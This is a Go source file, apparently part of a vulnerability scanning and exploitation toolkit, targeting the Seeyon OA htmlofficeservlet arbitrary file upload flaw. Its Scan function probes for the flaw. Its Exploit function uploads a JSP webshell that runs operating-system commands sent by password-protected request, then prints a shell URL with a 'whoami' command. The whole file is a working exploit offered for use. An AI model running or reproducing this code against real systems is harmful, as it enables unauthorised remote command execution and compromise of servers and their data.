package vulners

import (
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
	"strings"
)

type Sy06 struct {
}

func (s *Sy06) Scan(targetUrl string) {
	vulnerable, err := sy06scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[+]存在htmlofficeservlet任意文件上传")
	} else {
		color.White("[-]不存在htmlofficeservlet任意文件上传")
	}
}

func (*Sy06) Exploit(targetUrl string) {
	runResult, err := sy06runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.White(runResult)
	} else {
		color.White("[!]漏洞利用失败！")
	}
}

func sy06scancore(targetUrl string) (bool, error) {
	scancorePayload := "/seeyon/htmlofficeservlet"
	req, err := http.NewRequest("GET", targetUrl+scancorePayload, nil)
	if err != nil {
		return false, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36")
	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	respContent, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}
	if resp.StatusCode == 200 && strings.Contains(string(respContent), "htmoffice") {
		return true, nil
	} else {
		return false, nil
	}
}

func sy06runcore(targetUrl string) (string, error) {
	runcorePayload := `
DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
OPTION=S3WYOSWLBSGr
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
CREATEDATE=wUghPB3szB3Xwg66
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("seeyoner".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce
`
	req, err := http.NewRequest("POST", targetUrl+"/seeyon/htmlofficeservlet", strings.NewReader(runcorePayload))
	if err != nil {
		return "", err
	}
	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if checkShell(targetUrl) {
		return "文件上传成功！" + targetUrl + "/seeyon/test123456.jsp?pass=seeyoner&cmd=whoami", nil
	} else {
		return "", nil
	}
}
func checkShell(targetUrl string) (result bool) {
	shellpath := targetUrl + "/seeyon/test123456.jsp"
	req, err := http.NewRequest("GET", shellpath, nil)
	if err != nil {
		color.Red("[x]Webshell访问异常！")
		return
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36")
	resp, _ := (&http.Client{}).Do(req)
	defer resp.Body.Close()
	if resp.StatusCode == 200 {
		return true
	} else {
		return false
	}
}
